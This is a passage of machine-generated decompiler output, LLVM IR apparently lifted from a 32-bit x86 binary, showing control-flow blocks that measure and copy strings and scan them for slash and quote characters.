  %v2_8049d93 = inttoptr i32 %v1_8049d93 to i32*
  store i32 8, i32* %v2_8049d93, align 4
  br label %dec_label_pc_8049b32

dec_label_pc_8049da3:                             ; preds = %dec_label_pc_804965f
  %v9_8049da3 = icmp eq i32 %v0_80496b5, 12
  store i1 %v9_8049da3, i1* %zf.global-to-local, align 1
  %v0_8049da6 = load i32, i32* @edi, align 4
  %v2_8049da6 = add i32 %v0_80496b5, -16
  %v3_8049da6 = inttoptr i32 %v2_8049da6 to i32*
  store i32 %v0_8049da6, i32* %v3_8049da6, align 4
  %v2_8049da7 = call i32 @function_8051c40(i8* %v1_8048752)
  store i32 %v2_8049da7, i32* %eax.global-to-local, align 4
  %v0_8049dac = load i32, i32* @esp, align 4
  %v1_8049dac = add i32 %v0_8049dac, 16
  %v1_8049daf = add i32 %v2_8049da7, -127
  %v6_8049daf = sub i32 126, %v2_8049da7
  %v7_8049daf = and i32 %v6_8049daf, %v2_8049da7
  %v8_8049daf = icmp slt i32 %v7_8049daf, 0
  %v9_8049daf = icmp eq i32 %v1_8049daf, 0
  store i1 %v9_8049daf, i1* %zf.global-to-local, align 1
  %v10_8049daf = icmp slt i32 %v1_8049daf, 0
  %v3_8049db2 = icmp eq i1 %v10_8049daf, %v8_8049daf
  %v4_8049db2 = icmp eq i1 %v9_8049daf, false
  %v5_8049db2 = and i1 %v4_8049db2, %v3_8049db2
  br i1 %v5_8049db2, label %dec_label_pc_80496c3, label %dec_label_pc_8049db8

dec_label_pc_8049db8:                             ; preds = %dec_label_pc_8049da3
  %v2_8049db8 = add i32 %v0_8049dac, 12
  %v3_8049db8 = inttoptr i32 %v2_8049db8 to i32*
  store i32 %v2_8049da7, i32* %v3_8049db8, align 4
  %v2_8049db9 = add i32 %v0_8049dac, 8
  %v3_8049db9 = inttoptr i32 %v2_8049db9 to i32*
  store i32 %v2_8049da7, i32* %v3_8049db9, align 4
  %v0_8049dba = load i32, i32* @edi, align 4
  %v2_8049dba = add i32 %v0_8049dac, 4
  %v3_8049dba = inttoptr i32 %v2_8049dba to i32*
  store i32 %v0_8049dba, i32* %v3_8049dba, align 4
  %v1_8049dbb = add i32 %v0_8049dac, 108
  %v2_8049dbb = inttoptr i32 %v1_8049dbb to i32*
  %v3_8049dbb = load i32, i32* %v2_8049dbb, align 4
  store i32 %v3_8049dbb, i32* %edx.global-to-local, align 4
  %v1_8049dbf = add i32 %v3_8049dbb, 16
  %v2_8049dbf = inttoptr i32 %v1_8049dbf to i32*
  %v3_8049dbf = load i32, i32* %v2_8049dbf, align 4
  %v2_8049dc2 = mul i32 %v3_8049dbf, 128
  %v3_8049dc2 = icmp eq i32 %v2_8049dc2, 0
  store i1 %v3_8049dc2, i1* %zf.global-to-local, align 1
  %v0_8049dc5 = load i32, i32* @ebp, align 4
  %v2_8049dc5 = add i32 %v0_8049dc5, %v2_8049dc2
  store i32 %v2_8049dc5, i32* %eax.global-to-local, align 4
  %v3_8049dc9 = inttoptr i32 %v0_8049dac to i32*
  store i32 %v2_8049dc5, i32* %v3_8049dc9, align 4
  %v3_8049dca = call i32 @function_8051c60(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049dca, i32* %eax.global-to-local, align 4
  %v0_8049dcf = load i32, i32* @esp, align 4
  %v1_8049dcf = add i32 %v0_8049dcf, 108
  %v2_8049dcf = inttoptr i32 %v1_8049dcf to i32*
  %v3_8049dcf = load i32, i32* %v2_8049dcf, align 4
  store i32 %v3_8049dcf, i32* %ecx.global-to-local, align 4
  %v1_8049dd3 = add i32 %v3_8049dcf, 16
  %v2_8049dd3 = inttoptr i32 %v1_8049dd3 to i32*
  %v3_8049dd3 = load i32, i32* %v2_8049dd3, align 4
  %v2_8049dd6 = mul i32 %v3_8049dd3, 128
  %v3_8049dd6 = icmp eq i32 %v2_8049dd6, 0
  store i1 %v3_8049dd6, i1* %zf.global-to-local, align 1
  %v0_8049dd9 = load i32, i32* @ebp, align 4
  %v2_8049dd9 = add i32 %v0_8049dd9, %v2_8049dd6
  store i32 %v2_8049dd9, i32* %ebx.global-to-local, align 4
  %v2_8049ddd = inttoptr i32 %v0_8049dcf to i32*
  store i32 %v2_8049dd9, i32* %v2_8049ddd, align 4
  %v2_8049de0 = call i32 @function_8051c40(i8* %v1_8048752)
  store i32 %v2_8049de0, i32* %eax.global-to-local, align 4
  %v0_8049de5 = load i32, i32* @esp, align 4
  %v1_8049de5 = inttoptr i32 %v0_8049de5 to i32*
  %v2_8049de5 = load i32, i32* %v1_8049de5, align 4
  store i32 %v2_8049de5, i32* %ecx.global-to-local, align 4
  %v3_8049de5 = add i32 %v0_8049de5, 4
  %v0_8049de6 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8049de6 = add i32 %v0_8049de6, %v2_8049de0
  %v12_8049de6 = icmp eq i32 %v2_8049de6, 0
  store i1 %v12_8049de6, i1* %zf.global-to-local, align 1
  store i32 %v2_8049de6, i32* @ebx, align 4
  %v1_8049de8 = inttoptr i32 %v3_8049de5 to i32*
  store i32 ptrtoint (i32* @global_var_8054b13.19 to i32), i32* %v1_8049de8, align 4
  %v0_8049dee = load i32, i32* @ebx, align 4
  store i32 %v0_8049dee, i32* %v1_8049de5, align 4
  %v3_8049def = call i32 @function_8051c60(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049def, i32* %eax.global-to-local, align 4
  %v0_8049df4 = load i32, i32* @esp, align 4
  %v1_8049df4 = add i32 %v0_8049df4, 56
  %v2_8049df4 = inttoptr i32 %v1_8049df4 to i32*
  %v3_8049df4 = load i32, i32* %v2_8049df4, align 4
  store i32 %v3_8049df4, i32* %ebx.global-to-local, align 4
  %v1_8049df8 = add i32 %v0_8049df4, -4
  %v2_8049df8 = inttoptr i32 %v1_8049df8 to i32*
  store i32 1, i32* %v2_8049df8, align 4
  %v1_8049dfa = add i32 %v0_8049df4, -8
  %v2_8049dfa = inttoptr i32 %v1_8049dfa to i32*
  store i32 ptrtoint (i32* @global_var_8054b1a.16 to i32), i32* %v2_8049dfa, align 4
  %v1_8049dff = add i32 %v0_8049df4, 108
  %v2_8049dff = inttoptr i32 %v1_8049dff to i32*
  %v3_8049dff = load i32, i32* %v2_8049dff, align 4
  store i32 %v3_8049dff, i32* %edx.global-to-local, align 4
  %v0_8049e03 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049e03 = add i32 %v0_8049e03, 3
  store i32 %v1_8049e03, i32* @ebx, align 4
  %v0_8049e06 = load i32, i32* @esi, align 4
  %v2_8049e06 = add i32 %v0_8049e06, %v1_8049e03
  store i32 %v2_8049e06, i32* @esi, align 4
  %v1_8049e08 = add i32 %v3_8049dff, 660
  %v2_8049e08 = inttoptr i32 %v1_8049e08 to i32*
  %v3_8049e08 = load i32, i32* %v2_8049e08, align 4
  %v2_8049e0e = sub i32 %v3_8049e08, %v1_8049e03
  %v12_8049e0e = icmp eq i32 %v2_8049e0e, 0
  store i1 %v12_8049e0e, i1* %zf.global-to-local, align 1
  store i32 %v2_8049e0e, i32* %eax.global-to-local, align 4
  %v2_8049e10 = add i32 %v0_8049df4, -12
  %v3_8049e10 = inttoptr i32 %v2_8049e10 to i32*
  store i32 %v2_8049e0e, i32* %v3_8049e10, align 4
  %v0_8049e11 = load i32, i32* @esi, align 4
  %v2_8049e11 = add i32 %v0_8049df4, -16
  %v3_8049e11 = inttoptr i32 %v2_8049e11 to i32*
  store i32 %v0_8049e11, i32* %v3_8049e11, align 4
  %v0_8049e12 = call i32 @function_8051cf0()
  store i32 %v0_8049e12, i32* %eax.global-to-local, align 4
  %v0_8049e17 = load i32, i32* @esp, align 4
  %v1_8049e17 = add i32 %v0_8049e17, 108
  %v2_8049e17 = inttoptr i32 %v1_8049e17 to i32*
  %v3_8049e17 = load i32, i32* %v2_8049e17, align 4
  store i32 %v3_8049e17, i32* %edx.global-to-local, align 4
  %v0_8049e1b = load i32, i32* @ebx, align 4
  %v2_8049e1b = add i32 %v0_8049e1b, %v3_8049e17
  store i32 %v2_8049e1b, i32* %ebx.global-to-local, align 4
  %v2_8049e1d = add i32 %v0_8049e12, 2115
  %v3_8049e1d = add i32 %v2_8049e1d, %v2_8049e1b
  %v4_8049e1d = inttoptr i32 %v3_8049e1d to i8*
  store i8 0, i8* %v4_8049e1d, align 1
  %v0_8049e25 = load i32, i32* @esp, align 4
  %v1_8049e25 = add i32 %v0_8049e25, 124
  %v2_8049e25 = inttoptr i32 %v1_8049e25 to i32*
  %v3_8049e25 = load i32, i32* %v2_8049e25, align 4
  store i32 %v3_8049e25, i32* %ecx.global-to-local, align 4
  %v1_8049e2c = add i32 %v3_8049e25, 16
  %v2_8049e2c = inttoptr i32 %v1_8049e2c to i32*
  %v3_8049e2c = load i32, i32* %v2_8049e2c, align 4
  %v2_8049e2f = mul i32 %v3_8049e2c, 128
  %v3_8049e2f = icmp eq i32 %v2_8049e2f, 0
  store i1 %v3_8049e2f, i1* %zf.global-to-local, align 1
  %v0_8049e32 = load i32, i32* @ebp, align 4
  %v2_8049e32 = add i32 %v0_8049e32, %v2_8049e2f
  store i32 %v2_8049e32, i32* %ebx.global-to-local, align 4
  %v2_8049e36 = add i32 %v0_8049e25, 16
  %v3_8049e36 = inttoptr i32 %v2_8049e36 to i32*
  store i32 %v2_8049e32, i32* %v3_8049e36, align 4
  %v2_8049e37 = call i32 @function_8051c40(i8* %v1_8048752)
  store i32 %v2_8049e37, i32* %eax.global-to-local, align 4
  %v0_8049e3c = load i32, i32* @esp, align 4
  %v1_8049e3c = inttoptr i32 %v0_8049e3c to i32*
  %v2_8049e3c = load i32, i32* %v1_8049e3c, align 4
  store i32 %v2_8049e3c, i32* %ecx.global-to-local, align 4
  %v3_8049e3c = add i32 %v0_8049e3c, 4
  %v0_8049e3d = load i32, i32* %ebx.global-to-local, align 4
  %v2_8049e3d = add i32 %v0_8049e3d, %v2_8049e37
  %v12_8049e3d = icmp eq i32 %v2_8049e3d, 0
  store i1 %v12_8049e3d, i1* %zf.global-to-local, align 1
  store i32 %v2_8049e3d, i32* @ebx, align 4
  %v1_8049e3f = inttoptr i32 %v3_8049e3c to i32*
  %v2_8049e3f = load i32, i32* %v1_8049e3f, align 4
  store i32 %v2_8049e3f, i32* @edi, align 4
  %v0_8049e40 = load i32, i32* @esi, align 4
  store i32 %v0_8049e40, i32* %v1_8049e3f, align 4
  %v0_8049e41 = load i32, i32* @ebx, align 4
  store i32 %v0_8049e41, i32* %v1_8049e3c, align 4
  %v3_8049e42 = call i32 @function_8051c60(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049e42, i32* %eax.global-to-local, align 4
  %v0_8049e47 = load i32, i32* @esp, align 4
  %v1_8049e47 = add i32 %v0_8049e47, 108
  %v2_8049e47 = inttoptr i32 %v1_8049e47 to i32*
  %v3_8049e47 = load i32, i32* %v2_8049e47, align 4
  store i32 %v3_8049e47, i32* %eax.global-to-local, align 4
  %v1_8049e4b = add i32 %v3_8049e47, 16
  %v2_8049e4b = inttoptr i32 %v1_8049e4b to i32*
  %v3_8049e4b = load i32, i32* %v2_8049e4b, align 4
  %v1_8049e51 = add i32 %v3_8049e4b, 1
  %v8_8049e51 = icmp eq i32 %v1_8049e51, 0
  store i1 %v8_8049e51, i1* %zf.global-to-local, align 1
  store i32 %v1_8049e51, i32* %edx.global-to-local, align 4
  store i32 %v1_8049e51, i32* %v2_8049e4b, align 4
  %v0_80496c3.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80496c3

dec_label_pc_8049e5a:                             ; preds = %dec_label_pc_804974f
  store i32 %v3_8049e5a, i32* %eax.global-to-local, align 4
  %v1_8049e5e = add i32 %v3_8049e5a, -1448
  %v2_8049e5e = inttoptr i32 %v1_8049e5e to i8*
  store i8 1, i8* %v2_8049e5e, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8049e6a:                             ; preds = %dec_label_pc_8049a11
  %v1_8049e6a = add i32 %v0_8049a34, 20916
  %v2_8049e6a = inttoptr i32 %v1_8049e6a to i32*
  store i32 7, i32* %v2_8049e6a, align 4
  %v0_8049e75 = load i32, i32* @ebx, align 4
  %v1_8049e75 = add i32 %v0_8049e75, 4
  %v2_8049e75 = inttoptr i32 %v1_8049e75 to i8*
  %v3_8049e75 = load i8, i8* %v2_8049e75, align 1
  %v12_8049e75 = icmp eq i8 %v3_8049e75, 115
  store i1 %v12_8049e75, i1* %zf.global-to-local, align 1
  %v1_8049e79 = icmp eq i1 %v12_8049e75, false
  br i1 %v1_8049e79, label %dec_label_pc_8049e86, label %dec_label_pc_8049e7b

dec_label_pc_8049e7b:                             ; preds = %dec_label_pc_8049e6a
  %v0_8049e7b = load i32, i32* @esp, align 4
  %v1_8049e7b = add i32 %v0_8049e7b, 20900
  %v2_8049e7b = inttoptr i32 %v1_8049e7b to i32*
  store i32 8, i32* %v2_8049e7b, align 4
  br label %dec_label_pc_8049e86

dec_label_pc_8049e86:                             ; preds = %dec_label_pc_8049e6a, %dec_label_pc_8049e7b
  %v0_8049e86 = load i32, i32* @esp, align 4
  %v1_8049e86 = add i32 %v0_8049e86, 20900
  %v2_8049e86 = inttoptr i32 %v1_8049e86 to i32*
  %v3_8049e86 = load i32, i32* %v2_8049e86, align 4
  store i32 %v3_8049e86, i32* %edx.global-to-local, align 4
  %v2_8049e8d = add i32 %v0_8049e86, -4
  %v3_8049e8d = inttoptr i32 %v2_8049e8d to i32*
  store i32 4, i32* %v3_8049e8d, align 4
  %v0_8049e8e = load i32, i32* @edi, align 4
  %v1_8049e8e = add i32 %v0_8049e8e, 1
  %v1_8049e91 = load i32, i32* %edx.global-to-local, align 4
  %v2_8049e91 = sub i32 %v1_8049e8e, %v1_8049e91
  %v12_8049e91 = icmp eq i32 %v2_8049e91, 0
  store i1 %v12_8049e91, i1* %zf.global-to-local, align 1
  store i32 %v2_8049e91, i32* %eax.global-to-local, align 4
  %v0_8049e93 = load i32, i32* @ebx, align 4
  %v2_8049e93 = add i32 %v0_8049e93, %v1_8049e91
  store i32 %v2_8049e93, i32* %edx.global-to-local, align 4
  %v2_8049e96 = add i32 %v0_8049e86, -8
  %v3_8049e96 = inttoptr i32 %v2_8049e96 to i32*
  store i32 %v2_8049e91, i32* %v3_8049e96, align 4
  %v0_8049e97 = load i32, i32* %edx.global-to-local, align 4
  %v2_8049e97 = add i32 %v0_8049e86, -12
  %v3_8049e97 = inttoptr i32 %v2_8049e97 to i32*
  store i32 %v0_8049e97, i32* %v3_8049e97, align 4
  %v0_8049e98 = load i32, i32* @ebx, align 4
  %v2_8049e98 = add i32 %v0_8049e86, -16
  %v3_8049e98 = inttoptr i32 %v2_8049e98 to i32*
  store i32 %v0_8049e98, i32* %v3_8049e98, align 4
  %v4_8049e99 = call i32 @function_8052743(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049e99, i32* %eax.global-to-local, align 4
  %v0_8049e9e = load i32, i32* @esp, align 4
  %v1_8049e9e = add i32 %v0_8049e9e, 20916
  %v2_8049e9e = inttoptr i32 %v1_8049e9e to i32*
  store i32 0, i32* %v2_8049e9e, align 4
  %v0_8049ea9 = load i32, i32* @esp, align 4
  %v6_8049ea9 = icmp eq i32 %v0_8049ea9, -16
  store i1 %v6_8049ea9, i1* %zf.global-to-local, align 1
  %v0_8049eac = load i32, i32* @ebx, align 4
  %v1_8049eac = inttoptr i32 %v0_8049eac to i8*
  %v2_8049eac = load i8, i8* %v1_8049eac, align 1
  %v3_8049eac = zext i8 %v2_8049eac to i32
  %v5_8049eac = and i32 %v4_8049e99, -256
  %v6_8049eac = or i32 %v3_8049eac, %v5_8049eac
  store i32 %v6_8049eac, i32* %eax.global-to-local, align 4
  %v4_8049eae = icmp eq i8 %v2_8049eac, 0
  store i1 %v4_8049eae, i1* %zf.global-to-local, align 1
  br i1 %v4_8049eae, label %dec_label_pc_8049ce8, label %dec_label_pc_8049eb6

dec_label_pc_8049eb6:                             ; preds = %dec_label_pc_8049e86
  store i32 %v0_8049eac, i32* %ecx.global-to-local, align 4
  %v10_8049eb8 = icmp eq i8 %v2_8049eac, 47
  store i1 %v10_8049eb8, i1* %zf.global-to-local, align 1
  br i1 %v10_8049eb8, label %dec_label_pc_8049ce5, label %dec_label_pc_8049ec0

dec_label_pc_8049ec0:                             ; preds = %dec_label_pc_8049eb6
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_8049ed1195 = add i32 %v0_8049eac, 1
  store i32 %v2_8049ed1195, i32* %ecx.global-to-local, align 4
  %v2_8049ed4196 = add i32 %v0_8049ea9, 20916
  %v3_8049ed4197 = inttoptr i32 %v2_8049ed4196 to i32*
  store i32 1, i32* %v3_8049ed4197, align 4
  %v0_8049edb198 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049edb199 = inttoptr i32 %v0_8049edb198 to i8*
  %v2_8049edb200 = load i8, i8* %v1_8049edb199, align 1
  %v3_8049edb201 = zext i8 %v2_8049edb200 to i32
  %v4_8049edb202 = load i32, i32* %edx.global-to-local, align 4
  %v5_8049edb203 = and i32 %v4_8049edb202, -256
  %v6_8049edb204 = or i32 %v5_8049edb203, %v3_8049edb201
  store i32 %v6_8049edb204, i32* %edx.global-to-local, align 4
  %v4_8049edd205 = icmp eq i8 %v2_8049edb200, 0
  store i1 %v4_8049edd205, i1* %zf.global-to-local, align 1
  %v1_8049edf206 = icmp eq i1 %v4_8049edd205, false
  br i1 %v1_8049edf206, label %dec_label_pc_8049ec7, label %dec_label_pc_8049ce8

dec_label_pc_8049ec7:                             ; preds = %dec_label_pc_8049ec0, %dec_label_pc_8049ec7.dec_label_pc_8049ed1_crit_edge
  %v2_8049edb208 = phi i8 [ %v2_8049edb, %dec_label_pc_8049ec7.dec_label_pc_8049ed1_crit_edge ], [ %v2_8049edb200, %dec_label_pc_8049ec0 ]
  %v0_8049edb207 = phi i32 [ %v0_8049edb, %dec_label_pc_8049ec7.dec_label_pc_8049ed1_crit_edge ], [ %v0_8049edb198, %dec_label_pc_8049ec0 ]
  %v0_8049ec7 = load i32, i32* %eax.global-to-local, align 4
  %v1_8049ec7 = add i32 %v0_8049ec7, 1
  store i32 %v1_8049ec7, i32* %eax.global-to-local, align 4
  %v10_8049ec8 = icmp eq i8 %v2_8049edb208, 47
  store i1 %v10_8049ec8, i1* %zf.global-to-local, align 1
  br i1 %v10_8049ec8, label %dec_label_pc_8049ce5, label %dec_label_pc_8049ec7.dec_label_pc_8049ed1_crit_edge

dec_label_pc_8049ec7.dec_label_pc_8049ed1_crit_edge: ; preds = %dec_label_pc_8049ec7
  %v0_8049ed1.pre = load i32, i32* @ebx, align 4
  %v1_8049ed4.pre = load i32, i32* @esp, align 4
  %v2_8049ed1 = add i32 %v0_8049ed1.pre, %v1_8049ec7
  store i32 %v2_8049ed1, i32* %ecx.global-to-local, align 4
  %v2_8049ed4 = add i32 %v1_8049ed4.pre, 20900
  %v3_8049ed4 = inttoptr i32 %v2_8049ed4 to i32*
  store i32 %v1_8049ec7, i32* %v3_8049ed4, align 4
  %v0_8049edb = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049edb = inttoptr i32 %v0_8049edb to i8*
  %v2_8049edb = load i8, i8* %v1_8049edb, align 1
  %v3_8049edb = zext i8 %v2_8049edb to i32
  %v4_8049edb = load i32, i32* %edx.global-to-local, align 4
  %v5_8049edb = and i32 %v4_8049edb, -256
  %v6_8049edb = or i32 %v5_8049edb, %v3_8049edb
  store i32 %v6_8049edb, i32* %edx.global-to-local, align 4
  %v4_8049edd = icmp eq i8 %v2_8049edb, 0
  store i1 %v4_8049edd, i1* %zf.global-to-local, align 1
  %v1_8049edf = icmp eq i1 %v4_8049edd, false
  br i1 %v1_8049edf, label %dec_label_pc_8049ec7, label %dec_label_pc_8049ce8

dec_label_pc_8049ee6:                             ; preds = %dec_label_pc_8049930
  %v0_8049ee6 = load i32, i32* %edx.global-to-local, align 4
  %v1_8049ee6 = add i32 %v0_8049ee6, 2
  store i32 %v1_8049ee6, i32* %eax.global-to-local, align 4
  %v1_8049ee9 = load i32, i32* @esp, align 4
  %v2_8049ee9 = add i32 %v1_8049ee9, 20900
  %v3_8049ee9 = inttoptr i32 %v2_8049ee9 to i32*
  store i32 %v1_8049ee6, i32* %v3_8049ee9, align 4
  %v0_8049951.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804994e

dec_label_pc_8049ef5:                             ; preds = %dec_label_pc_80499c3
  %v1_8049ef5 = add i32 %v3_80499c3, 1
  store i32 %v1_8049ef5, i32* %ebx.global-to-local, align 4
  store i32 %v1_8049ef5, i32* %v2_80499c3, align 4
  %v0_8049eff = load i32, i32* @esp, align 4
  %v9_8049eff = icmp eq i32 %v0_8049eff, 12
  store i1 %v9_8049eff, i1* %zf.global-to-local, align 1
  %v0_8049f02 = load i32, i32* @esi, align 4
  %v1_8049f02 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8049f02 = add i32 %v1_8049f02, %v0_8049f02
  store i32 %v2_8049f02, i32* @ebx, align 4
  %v2_8049f05 = add i32 %v0_8049eff, -16
  %v3_8049f05 = inttoptr i32 %v2_8049f05 to i32*
  store i32 %v2_8049f02, i32* %v3_8049f05, align 4
  %v2_8049f06 = call i32 @function_8051c40(i8* %v1_8048752)
  store i32 %v2_8049f06, i32* %eax.global-to-local, align 4
  %v0_8049f0b = load i32, i32* @esp, align 4
  %v1_8049f0b = add i32 %v0_8049f0b, 16
  %v6_8049f0b = icmp eq i32 %v1_8049f0b, 0
  store i1 %v6_8049f0b, i1* %zf.global-to-local, align 1
  %v0_8049f0e = load i32, i32* @ebx, align 4
  %v2_8049f0e = add i32 %v2_8049f06, -1
  %v3_8049f0e = add i32 %v2_8049f0e, %v0_8049f0e
  %v4_8049f0e = inttoptr i32 %v3_8049f0e to i8*
  %v5_8049f0e = load i8, i8* %v4_8049f0e, align 1
  %v14_8049f0e = icmp eq i8 %v5_8049f0e, 34
  store i1 %v14_8049f0e, i1* %zf.global-to-local, align 1
  %v1_8049f13 = icmp eq i1 %v14_8049f0e, false
  br i1 %v1_8049f13, label %dec_label_pc_80499d4, label %dec_label_pc_8049f19

dec_label_pc_8049f19:                             ; preds = %dec_label_pc_8049ef5
  %v1_8049f19 = add i32 %v0_8049f0b, 20916
  %v2_8049f19 = inttoptr i32 %v1_8049f19 to i32*
  %v3_8049f19 = load i32, i32* %v2_8049f19, align 4
  store i32 %v3_8049f19, i32* %eax.global-to-local, align 4
  %v0_8049f20 = load i32, i32* @esi, align 4
  %v2_8049f25 = add i32 %v0_8049f20, %v3_8049f19
  %v12_8049f25 = icmp eq i32 %v2_8049f25, 0
  store i1 %v12_8049f25, i1* %zf.global-to-local, align 1
  store i32 %v2_8049f25, i32* @ebx, align 4
  %v3_8049f27 = inttoptr i32 %v0_8049f0b to i32*
  store i32 %v2_8049f25, i32* %v3_8049f27, align 4
  %v2_8049f28 = call i32 @function_8051c40(i8* %v1_8048752)
  store i32 %v2_8049f28, i32* %eax.global-to-local, align 4
  %v0_8049f2d = load i32, i32* @esp, align 4
  %v6_8049f2d = icmp eq i32 %v0_8049f2d, -16
  store i1 %v6_8049f2d, i1* %zf.global-to-local, align 1
  %v0_8049f30 = load i32, i32* @ebx, align 4
  %v2_8049f30 = add i32 %v2_8049f28, -1
  %v3_8049f30 = add i32 %v2_8049f30, %v0_8049f30
  %v4_8049f30 = inttoptr i32 %v3_8049f30 to i8*
  store i8 0, i8* %v4_8049f30, align 1
  %v0_80499d4.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_80499d4.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80499d4

dec_label_pc_8049f3a:                             ; preds = %dec_label_pc_804848a
  %v9_8049f3a = icmp eq i32 %v0_80484a0, 12
  store i1 %v9_8049f3a, i1* %zf.global-to-local, align 1
  %v1_8049f3d = add i32 %v0_80484a0, -16
  %v2_8049f3d = inttoptr i32 %v1_8049f3d to i32*
  store i32 47, i32* %v2_8049f3d, align 4
  %v2_8049f3f = call i32 @function_80512f0(i8 %v1_8049f3f)
  store i32 %v2_8049f3f, i32* %eax.global-to-local, align 4
  %v0_8049f44 = load i32, i32* @esp, align 4
  %v1_8049f44 = inttoptr i32 %v0_8049f44 to i32*
  %v2_8049f44 = load i32, i32* %v1_8049f44, align 4
  store i32 %v2_8049f44, i32* @ebx, align 4
  %v3_8049f44 = add i32 %v0_8049f44, 4
  %v1_8049f45 = inttoptr i32 %v3_8049f44 to i32*
  store i32 0, i32* %v1_8049f45, align 4
  store i32 47, i32* %v1_8049f44, align 4
  %v3_8049f4a = call i32 @function_8051240(i32 %tmp, i32* nonnull @0)
  store i32 %v3_8049f4a, i32* %eax.global-to-local, align 4
  %v0_8049f4f = load i32, i32* @esp, align 4
  %v1_8049f4f = inttoptr i32 %v0_8049f4f to i32*
  %v2_8049f4f = load i32, i32* %v1_8049f4f, align 4
  store i32 %v2_8049f4f, i32* %edx.global-to-local, align 4
  %v3_8049f4f = add i32 %v0_8049f4f, 4
  %v1_8049f50 = inttoptr i32 %v3_8049f4f to i32*
  %v2_8049f50 = load i32, i32* %v1_8049f50, align 4
  store i32 %v2_8049f50, i32* %ecx.global-to-local, align 4
  store i32 %v3_8049f4a, i32* %v1_8049f50, align 4
  %v0_8049f52 = load i32, i32* @esi, align 4
  %v1_8049f52 = add i32 %v0_8049f52, 20
  store i32 %v1_8049f52, i32* %eax.global-to-local, align 4
  store i32 %v1_8049f52, i32* %v1_8049f4f, align 4
  %v3_8049f56 = call i32 @function_8051c60(i8* %v2_8049f7d, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049f56, i32* %eax.global-to-local, align 4
  %v0_8049f5b = load i32, i32* @esp, align 4
  %v1_8049f5b = inttoptr i32 %v0_8049f5b to i32*
  store i32 47, i32* %v1_8049f5b, align 4
  %v2_8049f62 = call i32 @function_8051270(i8 %v1_8049f3f)
  store i32 %v2_8049f62, i32* %eax.global-to-local, align 4
  %v0_8049f67 = load i32, i32* @esp, align 4
  %v1_8049f67 = add i32 %v0_8049f67, 16
  %v6_8049f67 = icmp eq i32 %v1_8049f67, 0
  store i1 %v6_8049f67, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8049f6a

dec_label_pc_8049f6a:                             ; preds = %dec_label_pc_804848a, %dec_label_pc_804a062, %dec_label_pc_8049ff8, %dec_label_pc_8049fc3, %dec_label_pc_8049f3a
  %v1_8049f6a = phi i32 [ %v0_80484a0, %dec_label_pc_804848a ], [ %v1_804a08f, %dec_label_pc_804a062 ], [ %v1_804a025, %dec_label_pc_8049ff8 ], [ %v1_8049ff0, %dec_label_pc_8049fc3 ], [ %v1_8049f67, %dec_label_pc_8049f3a ]
  %v0_8049f6a = phi i32 [ %v2_80484ac, %dec_label_pc_804848a ], [ %v2_804a08a, %dec_label_pc_804a062 ], [ %v2_804a020, %dec_label_pc_8049ff8 ], [ %v2_8049feb, %dec_label_pc_8049fc3 ], [ %v2_8049f62, %dec_label_pc_8049f3a ]
  %v2_8049f6a = add i32 %v1_8049f6a, -4
  %v3_8049f6a = inttoptr i32 %v2_8049f6a to i32*
  store i32 %v0_8049f6a, i32* %v3_8049f6a, align 4
  %v0_8049f6b = load i32, i32* %eax.global-to-local, align 4
  %v2_8049f6b = add i32 %v1_8049f6a, -8
  %v3_8049f6b = inttoptr i32 %v2_8049f6b to i32*
  store i32 %v0_8049f6b, i32* %v3_8049f6b, align 4
  %v1_8049f6c = add i32 %v1_8049f6a, 64
  %v2_8049f6c = inttoptr i32 %v1_8049f6c to i32*
  %v3_8049f6c = load i32, i32* %v2_8049f6c, align 4
  store i32 %v3_8049f6c, i32* %eax.global-to-local, align 4
  %v0_8049f70 = load i32, i32* @ebp, align 4
  %v1_8049f70 = add i32 %v0_8049f70, 1
  store i32 %v1_8049f70, i32* @ebp, align 4
  %v2_8049f71 = add i32 %v1_8049f6a, -12
  %v3_8049f71 = inttoptr i32 %v2_8049f71 to i32*
  store i32 %v3_8049f6c, i32* %v3_8049f71, align 4
  %v0_8049f72 = load i32, i32* @esi, align 4
  %v1_8049f72 = add i32 %v0_8049f72, 3140
  %v9_8049f72 = icmp eq i32 %v1_8049f72, 0
  store i1 %v9_8049f72, i1* %zf.global-to-local, align 1
  store i32 %v1_8049f72, i32* @esi, align 4
  %v1_8049f78 = add i32 %v1_8049f6a, 36
  %v2_8049f78 = inttoptr i32 %v1_8049f78 to i32*
  %v3_8049f78 = load i32, i32* %v2_8049f78, align 4
  store i32 %v3_8049f78, i32* @edi, align 4
  %v2_8049f7c = add i32 %v1_8049f6a, -16
  %v3_8049f7c = inttoptr i32 %v2_8049f7c to i32*
  store i32 %v3_8049f78, i32* %v3_8049f7c, align 4
  %v3_8049f7d = call i32 @function_8051c60(i8* %v2_8049f7d, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049f7d, i32* %eax.global-to-local, align 4
  %v0_8049f82 = load i32, i32* @esp, align 4
  %v1_8049f85 = add i32 %v0_8049f82, 128
  %v2_8049f85 = inttoptr i32 %v1_8049f85 to i32*
  %v3_8049f85 = load i32, i32* %v2_8049f85, align 4
  %v4_8049f85 = load i32, i32* @ebp, align 4
  %v15_8049f85 = icmp eq i32 %v3_8049f85, %v4_8049f85
  store i1 %v15_8049f85, i1* %zf.global-to-local, align 1
  %v1_8049f89 = icmp eq i1 %v15_8049f85, false
  br i1 %v1_8049f89, label %dec_label_pc_8049f6a.dec_label_pc_80483a7_crit_edge, label %dec_label_pc_8049f8f

dec_label_pc_8049f6a.dec_label_pc_80483a7_crit_edge: ; preds = %dec_label_pc_8049f6a
